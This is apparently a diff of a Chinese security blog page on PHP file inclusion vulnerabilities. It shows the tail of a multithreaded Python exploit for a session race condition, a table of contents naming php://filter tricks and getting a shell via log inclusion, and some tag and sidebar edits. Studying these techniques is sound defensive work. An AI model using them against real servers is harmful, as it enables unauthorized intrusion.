class="keyword">with</span> requests.session() <span class="keyword">as</span> session:        <span class="comment">#多线程操作</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        threading.Thread(target=write).start()</span><br><span class="line">evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/ssft1rm9imexz3vi
-语雀文档ID: 135136142
-
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/ssft1rm9imexz3vi">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/ssft1rm9imexz3vi</a><br>语雀文档ID: 135136142</p>
 
     </div>
 
@@ -345,9 +314,9 @@ phpinfo();
 
       <footer class="post-footer">
           <div class="post-tags">
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
               <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
           </div>
 
         
@@ -421,6 +390,7 @@ phpinfo();
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.0.1.</span> <span class="nav-text">伪协议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-filter-convert-iconv"><span class="nav-number">2.</span> <span class="nav-text">php:&#x2F;&#x2F;filter,convert.iconv</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6-%E8%BF%9B%E8%A1%8Cgetshell"><span class="nav-number">3.</span> <span class="nav-text">包含日志文件 进行getshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.</span> <span class="nav-text">session条件竞争文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">4.1.</span> <span class="nav-text">利用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="nav-number">4.2.</span> <span class="nav-text">判断及原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E5%8F%8Aexp"><span class="nav-number">4.3.</span> <span class="nav-text">题目复现及exp</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -436,7 +406,7 @@ phpinfo();
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -449,7 +419,7 @@ phpinfo();
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
